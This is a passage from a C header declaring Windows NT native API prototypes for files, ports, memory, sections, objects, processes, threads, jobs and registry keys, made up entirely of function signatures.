    IN OPTIONAL HANDLE Event,
    IN OPTIONAL PIO_APC_ROUTINE ApcRoutine,
    IN OPTIONAL PVOID ApcContext,
    OUT PIO_STATUS_BLOCK IoStatusBlock,
    IN ULONG FsControlCode,
    IN OPTIONAL PVOID  InputBuffer,
    IN ULONG InputBufferLength,
    OUT OPTIONAL PVOID  OutputBuffer,
    IN ULONG OutputBufferLength
    );


NTSTATUS
NTAPI
NtLockFile (
    IN HANDLE FileHandle,
    IN OPTIONAL HANDLE Event,
    IN OPTIONAL PIO_APC_ROUTINE ApcRoutine,
    IN OPTIONAL PVOID ApcContext,
    OUT PIO_STATUS_BLOCK IoStatusBlock,
    IN PLARGE_INTEGER ByteOffset,
    IN PLARGE_INTEGER Length,
    IN ULONG Key,
    IN BOOLEAN FailImmediately,
    IN BOOLEAN ExclusiveLock
    );


NTSTATUS
NTAPI
NtOpenFile (
    OUT PHANDLE FileHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes,
    OUT PIO_STATUS_BLOCK IoStatusBlock,
    IN ULONG ShareAccess,
    IN ULONG OpenOptions
    );


NTSTATUS
NTAPI
NtQueryDirectoryFile (
    IN HANDLE FileHandle,
    IN OPTIONAL HANDLE Event,
    IN OPTIONAL PIO_APC_ROUTINE ApcRoutine,
    IN OPTIONAL PVOID ApcContext,
    OUT PIO_STATUS_BLOCK IoStatusBlock,
    OUT PVOID FileInformation,
    IN ULONG Length,
    IN FILE_INFORMATION_CLASS FileInformationClass,
    IN BOOLEAN ReturnSingleEntry,
    IN OPTIONAL PUNICODE_STRING FileName,
    IN BOOLEAN RestartScan
    );


NTSTATUS
NTAPI
NtQueryInformationFile (
    IN HANDLE FileHandle,
    OUT PIO_STATUS_BLOCK IoStatusBlock,
    OUT PVOID FileInformation,
    IN ULONG Length,
    IN FILE_INFORMATION_CLASS FileInformationClass
    );


NTSTATUS
NTAPI
NtQueryQuotaInformationFile (
    IN HANDLE FileHandle,
    OUT PIO_STATUS_BLOCK IoStatusBlock,
    OUT PVOID Buffer,
    IN ULONG Length,
    IN BOOLEAN ReturnSingleEntry,
    IN OPTIONAL PVOID  SidList,
    IN ULONG SidListLength,
    IN OPTIONAL PSID StartSid,
    IN BOOLEAN RestartScan
    );


NTSTATUS
NTAPI
NtQueryVolumeInformationFile (
    IN HANDLE FileHandle,
    OUT PIO_STATUS_BLOCK IoStatusBlock,
    OUT PVOID FsInformation,
    IN ULONG Length,
    IN FS_INFORMATION_CLASS FsInformationClass
    );


NTSTATUS
NTAPI
NtReadFile (
    IN HANDLE FileHandle,
    IN OPTIONAL HANDLE Event,
    IN OPTIONAL PIO_APC_ROUTINE ApcRoutine,
    IN OPTIONAL PVOID ApcContext,
    OUT PIO_STATUS_BLOCK IoStatusBlock,
    OUT PVOID Buffer,
    IN ULONG Length,
    IN OPTIONAL PLARGE_INTEGER ByteOffset,
    IN OPTIONAL PULONG Key
    );


NTSTATUS
NTAPI
NtSetInformationFile (
    IN HANDLE FileHandle,
    OUT PIO_STATUS_BLOCK IoStatusBlock,
    IN PVOID FileInformation,
    IN ULONG Length,
    IN FILE_INFORMATION_CLASS FileInformationClass
    );


NTSTATUS
NTAPI
NtSetQuotaInformationFile (
    IN HANDLE FileHandle,
    OUT PIO_STATUS_BLOCK IoStatusBlock,
    IN PVOID Buffer,
    IN ULONG Length
    );


NTSTATUS
NTAPI
NtSetVolumeInformationFile (
    IN HANDLE FileHandle,
    OUT PIO_STATUS_BLOCK IoStatusBlock,
    IN PVOID FsInformation,
    IN ULONG Length,
    IN FS_INFORMATION_CLASS FsInformationClass
    );


NTSTATUS
NTAPI
NtWriteFile (
    IN HANDLE FileHandle,
    IN OPTIONAL HANDLE Event,
    IN OPTIONAL PIO_APC_ROUTINE ApcRoutine,
    IN OPTIONAL PVOID ApcContext,
    OUT PIO_STATUS_BLOCK IoStatusBlock,
    IN PVOID Buffer,
    IN ULONG Length,
    IN OPTIONAL PLARGE_INTEGER ByteOffset,
    IN OPTIONAL PULONG Key
    );


NTSTATUS
NTAPI
NtUnlockFile (
    IN HANDLE FileHandle,
    OUT PIO_STATUS_BLOCK IoStatusBlock,
    IN PLARGE_INTEGER ByteOffset,
    IN PLARGE_INTEGER Length,
    IN ULONG Key
    );


NTSTATUS
NTAPI
NtReadFileScatter (
    IN HANDLE FileHandle,
    IN OPTIONAL HANDLE Event,
    IN OPTIONAL PIO_APC_ROUTINE ApcRoutine,
    IN OPTIONAL PVOID ApcContext,
    OUT PIO_STATUS_BLOCK IoStatusBlock,
    IN PFILE_SEGMENT_ELEMENT SegmentArray,
    IN ULONG Length,
    IN OPTIONAL PLARGE_INTEGER ByteOffset,
    IN OPTIONAL PULONG Key
    );


NTSTATUS
NTAPI
NtSetEaFile (
    IN HANDLE FileHandle,
    OUT PIO_STATUS_BLOCK IoStatusBlock,
    IN PVOID Buffer,
    IN ULONG Length
    );


NTSTATUS
NTAPI
NtWriteFileGather (
    IN HANDLE FileHandle,
    IN OPTIONAL HANDLE Event,
    IN OPTIONAL PIO_APC_ROUTINE ApcRoutine,
    IN OPTIONAL PVOID ApcContext,
    OUT PIO_STATUS_BLOCK IoStatusBlock,
    IN PFILE_SEGMENT_ELEMENT SegmentArray,
    IN ULONG Length,
    IN OPTIONAL PLARGE_INTEGER ByteOffset,
    IN OPTIONAL PULONG Key
    );


NTSTATUS
NTAPI
NtLoadDriver (
    IN PUNICODE_STRING DriverServiceName
    );


NTSTATUS
NTAPI
NtUnloadDriver (
    IN PUNICODE_STRING DriverServiceName
    );


NTSTATUS
NTAPI
NtCreateIoCompletion (
    OUT PHANDLE IoCompletionHandle,
    IN ACCESS_MASK DesiredAccess,
    IN OPTIONAL POBJECT_ATTRIBUTES ObjectAttributes,
    IN ULONG Count OPTIONAL
    );


NTSTATUS
NTAPI
NtOpenIoCompletion (
    OUT PHANDLE IoCompletionHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes
    );


NTSTATUS
NTAPI
NtQueryIoCompletion (
    IN HANDLE IoCompletionHandle,
    IN IO_COMPLETION_INFORMATION_CLASS IoCompletionInformationClass,
    OUT PVOID IoCompletionInformation,
    IN ULONG IoCompletionInformationLength,
    OUT OPTIONAL PULONG ReturnLength
    );


NTSTATUS
NTAPI
NtSetIoCompletion (
    IN HANDLE IoCompletionHandle,
    IN PVOID KeyContext,
    IN OPTIONAL PVOID ApcContext,
    IN NTSTATUS IoStatus,
    IN ULONG_PTR IoStatusInformation
    );


NTSTATUS
NTAPI
NtRemoveIoCompletion (
    IN HANDLE IoCompletionHandle,
    OUT PVOID *KeyContext,
    OUT PVOID *ApcContext,
    OUT PIO_STATUS_BLOCK IoStatusBlock,
    IN OPTIONAL PLARGE_INTEGER Timeout
    );


NTSTATUS
NTAPI
NtCallbackReturn (
    IN PVOID OutputBuffer OPTIONAL,
    IN ULONG OutputLength,
    IN NTSTATUS Status
    );


NTSTATUS
NTAPI
NtQueryDebugFilterState (
    IN ULONG ComponentId,
    IN ULONG Level
    );


NTSTATUS
NTAPI
NtSetDebugFilterState (
    IN ULONG ComponentId,
    IN ULONG Level,
    IN BOOLEAN State
    );


NTSTATUS
NTAPI
NtYieldExecution (
    VOID
    );


NTSTATUS
NTAPI
NtCreatePort(
    OUT PHANDLE PortHandle,
    IN POBJECT_ATTRIBUTES ObjectAttributes,
    IN ULONG MaxConnectionInfoLength,
    IN ULONG MaxMessageLength,
    IN OPTIONAL ULONG MaxPoolUsage
    );


NTSTATUS
NTAPI
NtCreateWaitablePort(
    OUT PHANDLE PortHandle,
    IN POBJECT_ATTRIBUTES ObjectAttributes,
    IN ULONG MaxConnectionInfoLength,
    IN ULONG MaxMessageLength,
    IN OPTIONAL ULONG MaxPoolUsage
    );


NTSTATUS
NTAPI
NtConnectPort(
    OUT PHANDLE PortHandle,
    IN PUNICODE_STRING PortName,
    IN PSECURITY_QUALITY_OF_SERVICE SecurityQos,
    IN OUT OPTIONAL PPORT_VIEW ClientView,
    IN OUT OPTIONAL PREMOTE_PORT_VIEW ServerView,
    OUT OPTIONAL PULONG MaxMessageLength,
    IN OUT OPTIONAL PVOID ConnectionInformation,
    IN OUT OPTIONAL PULONG ConnectionInformationLength
    );


NTSTATUS
NTAPI
NtSecureConnectPort(
    OUT PHANDLE PortHandle,
    IN PUNICODE_STRING PortName,
    IN PSECURITY_QUALITY_OF_SERVICE SecurityQos,
    IN OUT OPTIONAL PPORT_VIEW ClientView,
    IN OPTIONAL PSID RequiredServerSid,
    IN OUT OPTIONAL PREMOTE_PORT_VIEW ServerView,
    OUT OPTIONAL PULONG MaxMessageLength,
    IN OUT OPTIONAL PVOID ConnectionInformation,
    IN OUT OPTIONAL PULONG ConnectionInformationLength
    );


NTSTATUS
NTAPI
NtListenPort(
    IN HANDLE PortHandle,
    OUT PPORT_MESSAGE ConnectionRequest
    );


NTSTATUS
NTAPI
NtAcceptConnectPort(
    OUT PHANDLE PortHandle,
    IN OPTIONAL PVOID PortContext,
    IN PPORT_MESSAGE ConnectionRequest,
    IN BOOLEAN AcceptConnection,
    IN OUT OPTIONAL PPORT_VIEW ServerView,
    OUT OPTIONAL PREMOTE_PORT_VIEW ClientView
    );


NTSTATUS
NTAPI
NtCompleteConnectPort(
    IN HANDLE PortHandle
    );


NTSTATUS
NTAPI
NtRequestPort(
    IN HANDLE PortHandle,
    IN PPORT_MESSAGE RequestMessage
    );


NTSTATUS
NTAPI
NtRequestWaitReplyPort(
    IN HANDLE PortHandle,
    IN PPORT_MESSAGE RequestMessage,
    OUT PPORT_MESSAGE ReplyMessage
    );


NTSTATUS
NTAPI
NtReplyPort(
    IN HANDLE PortHandle,
    IN PPORT_MESSAGE ReplyMessage
    );


NTSTATUS
NTAPI
NtReplyWaitReplyPort(
    IN HANDLE PortHandle,
    IN OUT PPORT_MESSAGE ReplyMessage
    );


NTSTATUS
NTAPI
NtReplyWaitReceivePort(
    IN HANDLE PortHandle,
    OUT OPTIONAL PVOID *PortContext ,
    IN OPTIONAL PPORT_MESSAGE ReplyMessage,
    OUT PPORT_MESSAGE ReceiveMessage
    );


NTSTATUS
NTAPI
NtReplyWaitReceivePortEx(
    IN HANDLE PortHandle,
    OUT OPTIONAL PVOID *PortContext,
    IN OPTIONAL PPORT_MESSAGE ReplyMessage,
    OUT PPORT_MESSAGE ReceiveMessage,
    IN OPTIONAL PLARGE_INTEGER Timeout
    );


NTSTATUS
NTAPI
NtImpersonateClientOfPort(
    IN HANDLE PortHandle,
    IN PPORT_MESSAGE Message
    );


NTSTATUS
NTAPI
NtReadRequestData(
    IN HANDLE PortHandle,
    IN PPORT_MESSAGE Message,
    IN ULONG DataEntryIndex,
    OUT PVOID Buffer,
    IN SIZE_T BufferSize,
    OUT OPTIONAL PSIZE_T NumberOfBytesRead
    );


NTSTATUS
NTAPI
NtWriteRequestData(
    IN HANDLE PortHandle,
    IN PPORT_MESSAGE Message,
    IN ULONG DataEntryIndex,
    IN PVOID Buffer,
    IN SIZE_T BufferSize,
    OUT OPTIONAL PSIZE_T NumberOfBytesWritten
    );


NTSTATUS
NTAPI
NtQueryInformationPort(
    IN HANDLE PortHandle,
    IN PORT_INFORMATION_CLASS PortInformationClass,
    OUT PVOID PortInformation,
    IN ULONG Length,
    OUT OPTIONAL PULONG ReturnLength
    );


NTSTATUS
NTAPI
NtCreateSection (
    OUT PHANDLE SectionHandle,
    IN ACCESS_MASK DesiredAccess,
    IN OPTIONAL POBJECT_ATTRIBUTES ObjectAttributes,
    IN OPTIONAL PLARGE_INTEGER MaximumSize,
    IN ULONG SectionPageProtection,
    IN ULONG AllocationAttributes,
    IN OPTIONAL HANDLE FileHandle
    );


NTSTATUS
NTAPI
NtOpenSection (
    OUT PHANDLE SectionHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes
    );


NTSTATUS
NTAPI
NtMapViewOfSection (
    IN HANDLE SectionHandle,
    IN HANDLE ProcessHandle,
    IN OUT PVOID *BaseAddress,
    IN ULONG_PTR ZeroBits,
    IN SIZE_T CommitSize,
    IN OUT OPTIONAL PLARGE_INTEGER SectionOffset,
    IN OUT PSIZE_T ViewSize,
    IN SECTION_INHERIT InheritDisposition,
    IN ULONG AllocationType,
    IN ULONG Win32Protect
    );


NTSTATUS
NTAPI
NtUnmapViewOfSection (
    IN HANDLE ProcessHandle,
    IN PVOID BaseAddress
    );


NTSTATUS
NTAPI
NtExtendSection (
    IN HANDLE SectionHandle,
    IN OUT PLARGE_INTEGER NewSectionSize
    );


NTSTATUS
NTAPI
NtAreMappedFilesTheSame (
    IN PVOID File1MappedAsAnImage,
    IN PVOID File2MappedAsFile
    );


NTSTATUS
NTAPI
NtAllocateVirtualMemory (
    IN HANDLE ProcessHandle,
    IN OUT PVOID *BaseAddress,
    IN ULONG_PTR ZeroBits,
    IN OUT PSIZE_T RegionSize,
    IN ULONG AllocationType,
    IN ULONG Protect
    );


NTSTATUS
NTAPI
NtFreeVirtualMemory (
    IN HANDLE ProcessHandle,
    IN OUT PVOID *BaseAddress,
    IN OUT PSIZE_T RegionSize,
    IN ULONG FreeType
    );


NTSTATUS
NTAPI
NtReadVirtualMemory (
    IN HANDLE ProcessHandle,
    IN OPTIONAL PVOID BaseAddress,
    OUT PVOID Buffer,
    IN SIZE_T BufferSize,
    OUT OPTIONAL PSIZE_T NumberOfBytesRead
    );


NTSTATUS
NTAPI
NtWriteVirtualMemory (
    IN HANDLE ProcessHandle,
    IN OPTIONAL PVOID BaseAddress,
    IN CONST VOID *Buffer,
    IN SIZE_T BufferSize,
    OUT OPTIONAL PSIZE_T NumberOfBytesWritten
    );


NTSTATUS
NTAPI
NtFlushVirtualMemory (
    IN HANDLE ProcessHandle,
    IN OUT PVOID *BaseAddress,
    IN OUT PSIZE_T RegionSize,
    OUT PIO_STATUS_BLOCK IoStatus
    );


NTSTATUS
NTAPI
NtLockVirtualMemory (
    IN HANDLE ProcessHandle,
    IN OUT PVOID *BaseAddress,
    IN OUT PSIZE_T RegionSize,
    IN ULONG MapType
    );


NTSTATUS
NTAPI
NtUnlockVirtualMemory (
    IN HANDLE ProcessHandle,
    IN OUT PVOID *BaseAddress,
    IN OUT PSIZE_T RegionSize,
    IN ULONG MapType
    );


NTSTATUS
NTAPI
NtProtectVirtualMemory (
    IN HANDLE ProcessHandle,
    IN OUT PVOID *BaseAddress,
    IN OUT PSIZE_T RegionSize,
    IN ULONG NewProtect,
    OUT PULONG OldProtect
    );


NTSTATUS
NTAPI
NtQueryVirtualMemory (
    IN HANDLE ProcessHandle,
    IN PVOID BaseAddress,
    IN MEMORY_INFORMATION_CLASS MemoryInformationClass,
    OUT PVOID MemoryInformation,
    IN SIZE_T MemoryInformationLength,
    OUT OPTIONAL PSIZE_T ReturnLength
    );


NTSTATUS
NTAPI
NtQuerySection (
    IN HANDLE SectionHandle,
    IN SECTION_INFORMATION_CLASS SectionInformationClass,
    OUT PVOID SectionInformation,
    IN SIZE_T SectionInformationLength,
    OUT OPTIONAL PSIZE_T ReturnLength
    );


NTSTATUS
NTAPI
NtMapUserPhysicalPages (
    IN PVOID VirtualAddress,
    IN ULONG_PTR NumberOfPages,
    IN OPTIONAL PULONG_PTR UserPfnArray
    );


NTSTATUS
NTAPI
NtMapUserPhysicalPagesScatter (
    IN PVOID *VirtualAddresses,
    IN ULONG_PTR NumberOfPages,
    IN OPTIONAL PULONG_PTR UserPfnArray
    );


NTSTATUS
NTAPI
NtAllocateUserPhysicalPages (
    IN HANDLE ProcessHandle,
    IN OUT PULONG_PTR NumberOfPages,
    OUT PULONG_PTR UserPfnArray
    );


NTSTATUS
NTAPI
NtFreeUserPhysicalPages (
    IN HANDLE ProcessHandle,
    IN OUT PULONG_PTR NumberOfPages,
    IN PULONG_PTR UserPfnArray
    );


NTSTATUS
NTAPI
NtGetWriteWatch (
    IN HANDLE ProcessHandle,
    IN ULONG Flags,
    IN PVOID BaseAddress,
    IN SIZE_T RegionSize,
    OUT PVOID *UserAddressArray,
    IN OUT PULONG_PTR EntriesInUserAddressArray,
    OUT PULONG Granularity
    );


NTSTATUS
NTAPI
NtResetWriteWatch (
    IN HANDLE ProcessHandle,
    IN PVOID BaseAddress,
    IN SIZE_T RegionSize
    );


NTSTATUS
NTAPI
NtCreatePagingFile (
    IN PUNICODE_STRING PageFileName,
    IN PLARGE_INTEGER MinimumSize,
    IN PLARGE_INTEGER MaximumSize,
    IN ULONG Priority
    );


NTSTATUS
NTAPI
NtFlushInstructionCache (
    IN HANDLE ProcessHandle,
    IN OPTIONAL PVOID BaseAddress,
    IN SIZE_T Length
    );


NTSTATUS
NTAPI
NtFlushWriteBuffer (
    VOID
    );


NTSTATUS
NTAPI
NtQueryObject (
    IN HANDLE Handle,
    IN OBJECT_INFORMATION_CLASS ObjectInformationClass,
    OUT PVOID ObjectInformation,
    IN ULONG ObjectInformationLength,
    OUT PULONG ReturnLength
    );


NTSTATUS
NTAPI
NtSetInformationObject (
    IN HANDLE Handle,
    IN OBJECT_INFORMATION_CLASS ObjectInformationClass,
    IN PVOID ObjectInformation,
    IN ULONG ObjectInformationLength
    );


NTSTATUS
NTAPI
NtDuplicateObject (
    IN HANDLE SourceProcessHandle,
    IN HANDLE SourceHandle,
    IN OPTIONAL HANDLE TargetProcessHandle,
    OUT PHANDLE TargetHandle,
    IN ACCESS_MASK DesiredAccess,
    IN ULONG HandleAttributes,
    IN ULONG Options
    );


NTSTATUS
NTAPI
NtMakeTemporaryObject (
    IN HANDLE Handle
    );


NTSTATUS
NTAPI
NtMakePermanentObject (
    IN HANDLE Handle
    );


NTSTATUS
NTAPI
NtSignalAndWaitForSingleObject (
    IN HANDLE SignalHandle,
    IN HANDLE WaitHandle,
    IN BOOLEAN Alertable,
    IN OPTIONAL PLARGE_INTEGER Timeout
    );


NTSTATUS
NTAPI
NtWaitForSingleObject (
    IN HANDLE Handle,
    IN BOOLEAN Alertable,
    IN OPTIONAL PLARGE_INTEGER Timeout
    );


NTSTATUS
NTAPI
NtWaitForMultipleObjects (
    IN ULONG Count,
    IN HANDLE Handles[],
    IN WAIT_TYPE WaitType,
    IN BOOLEAN Alertable,
    IN OPTIONAL PLARGE_INTEGER Timeout
    );


NTSTATUS
NTAPI
NtWaitForMultipleObjects32 (
    IN ULONG Count,
    IN LONG Handles[],
    IN WAIT_TYPE WaitType,
    IN BOOLEAN Alertable,
    IN OPTIONAL PLARGE_INTEGER Timeout
    );


NTSTATUS
NTAPI
NtSetSecurityObject (
    IN HANDLE Handle,
    IN SECURITY_INFORMATION SecurityInformation,
    IN PSECURITY_DESCRIPTOR SecurityDescriptor
    );


NTSTATUS
NTAPI
NtQuerySecurityObject (
    IN HANDLE Handle,
    IN SECURITY_INFORMATION SecurityInformation,
    OUT PSECURITY_DESCRIPTOR SecurityDescriptor,
    IN ULONG Length,
    OUT PULONG LengthNeeded
    );


NTSTATUS
NTAPI
NtClose (
    IN HANDLE Handle
    );


NTSTATUS
NTAPI
NtCreateDirectoryObject (
    OUT PHANDLE DirectoryHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes
    );


NTSTATUS
NTAPI
NtOpenDirectoryObject (
    OUT PHANDLE DirectoryHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes
    );


NTSTATUS
NTAPI
NtQueryDirectoryObject (
    IN HANDLE DirectoryHandle,
    OUT PVOID Buffer,
    IN ULONG Length,
    IN BOOLEAN ReturnSingleEntry,
    IN BOOLEAN RestartScan,
    IN OUT  PULONG Context,
    OUT PULONG ReturnLength
    );


NTSTATUS
NTAPI
NtCreateSymbolicLinkObject (
    OUT PHANDLE LinkHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes,
    IN PUNICODE_STRING LinkTarget
    );


NTSTATUS
NTAPI
NtOpenSymbolicLinkObject (
    OUT PHANDLE LinkHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes
    );


NTSTATUS
NTAPI
NtQuerySymbolicLinkObject (
    IN HANDLE LinkHandle,
    IN OUT  PUNICODE_STRING LinkTarget,
    OUT PULONG ReturnedLength
    );


NTSTATUS
NTAPI
NtGetPlugPlayEvent (
    IN HANDLE EventHandle,
    IN OPTIONAL PVOID Context,
    OUT PPLUGPLAY_EVENT_BLOCK EventBlock,
    IN  ULONG EventBufferSize
    );


NTSTATUS
NTAPI
NtPlugPlayControl(
    IN PLUGPLAY_CONTROL_CLASS PnPControlClass,
    IN OUT PVOID PnPControlData,
    IN ULONG PnPControlDataLength
    );


NTSTATUS
NTAPI
NtPowerInformation(
    IN POWER_INFORMATION_LEVEL InformationLevel,
    IN OPTIONAL PVOID InputBuffer,
    IN ULONG InputBufferLength,
    OUT OPTIONAL PVOID OutputBuffer,
    IN ULONG OutputBufferLength
    );


NTSTATUS
NTAPI
NtSetThreadExecutionState(
    IN EXECUTION_STATE esFlags,               // ES_xxx flags
    OUT EXECUTION_STATE *PreviousFlags
    );


NTSTATUS
NTAPI
NtRequestWakeupLatency(
    IN LATENCY_TIME latency
    );


// NTSTATUS
// NTAPI
// NtInitiatePowerAction(
//     IN POWER_ACTION SystemAction,
//     IN SYSTEM_POWER_STATE MinSystemState,
//     IN ULONG Flags,                 // POWER_ACTION_xxx flags
//     IN BOOLEAN Asynchronous
//     );


// NTSTATUS
// NTAPI
// NtSetSystemPowerState(
//     IN POWER_ACTION SystemAction,
//     IN SYSTEM_POWER_STATE MinSystemState,
//     IN ULONG Flags                  // POWER_ACTION_xxx flags
//     );


// NTSTATUS
// NTAPI
// NtGetDevicePowerState(
//     IN HANDLE Device,
//     OUT DEVICE_POWER_STATE *State
//     );


NTSTATUS
NTAPI
NtCancelDeviceWakeupRequest(
    IN HANDLE Device
    );


NTSTATUS
NTAPI
NtRequestDeviceWakeup(
    IN HANDLE Device
    );


NTSTATUS
NTAPI
NtCreateProcess (
    OUT PHANDLE ProcessHandle,
    IN ACCESS_MASK DesiredAccess,
    IN OPTIONAL POBJECT_ATTRIBUTES ObjectAttributes,
    IN HANDLE ParentProcess,
    IN BOOLEAN InheritObjectTable,
    IN OPTIONAL HANDLE SectionHandle,
    IN OPTIONAL HANDLE DebugPort,
    IN OPTIONAL HANDLE ExceptionPort
    );


NTSTATUS
NTAPI
NtCreateProcessEx(
    OUT PHANDLE ProcessHandle,
    IN ACCESS_MASK DesiredAccess,
    IN OPTIONAL POBJECT_ATTRIBUTES ObjectAttributes,
    IN HANDLE ParentProcess,
    IN ULONG Flags,
    IN OPTIONAL HANDLE SectionHandle,
    IN OPTIONAL HANDLE DebugPort,
    IN OPTIONAL HANDLE ExceptionPort,
    IN ULONG JobMemberLevel
    );


NTSTATUS
NTAPI
NtOpenProcess (
    OUT PHANDLE ProcessHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes,
    IN OPTIONAL PCLIENT_ID ClientId
    );


NTSTATUS
NTAPI
NtTerminateProcess (
    IN OPTIONAL HANDLE ProcessHandle,
    IN NTSTATUS ExitStatus
    );


NTSTATUS
NTAPI
NtQueryInformationProcess (
    IN HANDLE ProcessHandle,
    IN PROCESSINFOCLASS ProcessInformationClass,
    OUT PVOID ProcessInformation,
    IN ULONG ProcessInformationLength,
    OUT OPTIONAL PULONG ReturnLength
    );


NTSTATUS
NTAPI
NtGetNextProcess (
    IN HANDLE ProcessHandle,
    IN ACCESS_MASK DesiredAccess,
    IN ULONG HandleAttributes,
    IN ULONG Flags,
    OUT PHANDLE NewProcessHandle
    );


NTSTATUS
NTAPI
NtGetNextThread (
    IN HANDLE ProcessHandle,
    IN HANDLE ThreadHandle,
    IN ACCESS_MASK DesiredAccess,
    IN ULONG HandleAttributes,
    IN ULONG Flags,
    OUT PHANDLE NewThreadHandle
    );


NTSTATUS
NTAPI
NtQueryPortInformationProcess (
    VOID
    );


NTSTATUS
NTAPI
NtSetInformationProcess (
    IN HANDLE ProcessHandle,
    IN PROCESSINFOCLASS ProcessInformationClass,
    IN PVOID ProcessInformation,
    IN ULONG ProcessInformationLength
    );

NTSTATUS
NTAPI
NtCreateThreadEx (
    OUT PHANDLE ThreadHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes,
    IN HANDLE ProcessHandle,
    IN LPVOID StartRoutine,
    IN LPVOID Argument,
    IN ULONG CreateFlags,
    IN ULONG_PTR ZeroBits,
    IN SIZE_T CommitSize,
    IN SIZE_T MaximumStackSize,
    IN LPVOID AttributeList
);


NTSTATUS
NTAPI
NtCreateThread (
    OUT PHANDLE ThreadHandle,
    IN ACCESS_MASK DesiredAccess,
    IN OPTIONAL POBJECT_ATTRIBUTES ObjectAttributes,
    IN HANDLE ProcessHandle,
    OUT PCLIENT_ID ClientId,
    IN PCONTEXT ThreadContext,
    IN PINITIAL_TEB InitialTeb,
    IN BOOLEAN CreateSuspended
    );


NTSTATUS
NTAPI
NtOpenThread (
    OUT PHANDLE ThreadHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes,
    IN OPTIONAL PCLIENT_ID ClientId
    );


NTSTATUS
NTAPI
NtTerminateThread (
    IN OPTIONAL HANDLE ThreadHandle,
    IN NTSTATUS ExitStatus
    );


NTSTATUS
NTAPI
NtSuspendThread (
    IN HANDLE ThreadHandle,
    OUT OPTIONAL PULONG PreviousSuspendCount
    );


NTSTATUS
NTAPI
NtResumeThread (
    IN HANDLE ThreadHandle,
    OUT OPTIONAL PULONG PreviousSuspendCount
    );


NTSTATUS
NTAPI
NtSuspendProcess (
	HANDLE ProcessHandle
	);


NTSTATUS
NTAPI
NtResumeProcess (
    IN HANDLE ProcessHandle
    );


NTSTATUS
NTAPI
NtGetContextThread (
    IN HANDLE ThreadHandle,
    IN OUT PCONTEXT ThreadContext
    );


NTSTATUS
NTAPI
NtSetContextThread (
    IN HANDLE ThreadHandle,
    IN PCONTEXT ThreadContext
    );


NTSTATUS
NTAPI
NtQueryInformationThread (
    IN HANDLE ThreadHandle,
    IN THREADINFOCLASS ThreadInformationClass,
    OUT PVOID ThreadInformation,
    IN ULONG ThreadInformationLength,
    OUT OPTIONAL PULONG ReturnLength
    );


NTSTATUS
NTAPI
NtSetInformationThread (
    IN HANDLE ThreadHandle,
    IN THREADINFOCLASS ThreadInformationClass,
    IN PVOID ThreadInformation,
    IN ULONG ThreadInformationLength
    );


NTSTATUS
NTAPI
NtAlertThread (
    IN HANDLE ThreadHandle
    );


NTSTATUS
NTAPI
NtAlertResumeThread (
    IN HANDLE ThreadHandle,
    OUT OPTIONAL PULONG PreviousSuspendCount
    );


NTSTATUS
NTAPI
NtImpersonateThread (
    IN HANDLE ServerThreadHandle,
    IN HANDLE ClientThreadHandle,
    IN PSECURITY_QUALITY_OF_SERVICE SecurityQos
    );


NTSTATUS
NTAPI
NtTestAlert (
    VOID
    );


NTSTATUS
NTAPI
NtRegisterThreadTerminatePort (
    IN HANDLE PortHandle
    );


NTSTATUS
NTAPI
NtSetLdtEntries (
    IN ULONG Selector0,
    IN ULONG Entry0Low,
    IN ULONG Entry0Hi,
    IN ULONG Selector1,
    IN ULONG Entry1Low,
    IN ULONG Entry1Hi
    );


NTSTATUS
NTAPI
NtQueueApcThread (
    IN HANDLE ThreadHandle,
    IN PPS_APC_ROUTINE ApcRoutine,
    IN OPTIONAL PVOID ApcArgument1,
    IN OPTIONAL PVOID ApcArgument2,
    IN OPTIONAL PVOID ApcArgument3
    );


NTSTATUS
NTAPI
NtCreateJobObject (
    OUT PHANDLE JobHandle,
    IN ACCESS_MASK DesiredAccess,
    IN OPTIONAL POBJECT_ATTRIBUTES ObjectAttributes
    );


NTSTATUS
NTAPI
NtOpenJobObject (
    OUT PHANDLE JobHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes
    );


NTSTATUS
NTAPI
NtAssignProcessToJobObject (
    IN HANDLE JobHandle,
    IN HANDLE ProcessHandle
    );


NTSTATUS
NTAPI
NtTerminateJobObject (
    IN HANDLE JobHandle,
    IN NTSTATUS ExitStatus
    );


NTSTATUS
NTAPI
NtIsProcessInJob (
    IN HANDLE ProcessHandle,
    IN OPTIONAL HANDLE JobHandle
    );


NTSTATUS
NTAPI
NtCreateJobSet (
    IN ULONG NumJob,
    IN PJOB_SET_ARRAY UserJobSet,
    IN ULONG Flags
    );


NTSTATUS
NTAPI
NtQueryInformationJobObject (
    IN OPTIONAL HANDLE JobHandle,
    IN JOBOBJECTINFOCLASS JobObjectInformationClass,
    OUT PVOID JobObjectInformation,
    IN ULONG JobObjectInformationLength,
    OUT OPTIONAL PULONG ReturnLength
    );


NTSTATUS
NTAPI
NtSetInformationJobObject (
    IN HANDLE JobHandle,
    IN JOBOBJECTINFOCLASS JobObjectInformationClass,
    IN PVOID JobObjectInformation,
    IN ULONG JobObjectInformationLength
    );


NTSTATUS
NTAPI
NtCreateKey(
    OUT PHANDLE KeyHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes,
    ULONG TitleIndex,
    IN OPTIONAL PUNICODE_STRING Class,
    IN ULONG CreateOptions,
    OUT OPTIONAL PULONG Disposition
    );


NTSTATUS
NTAPI
NtDeleteKey(
    IN HANDLE KeyHandle
    );


NTSTATUS
NTAPI
NtDeleteValueKey(
    IN HANDLE KeyHandle,
    IN PUNICODE_STRING ValueName
    );


NTSTATUS
NTAPI
NtEnumerateKey(
    IN HANDLE KeyHandle,
    IN ULONG Index,
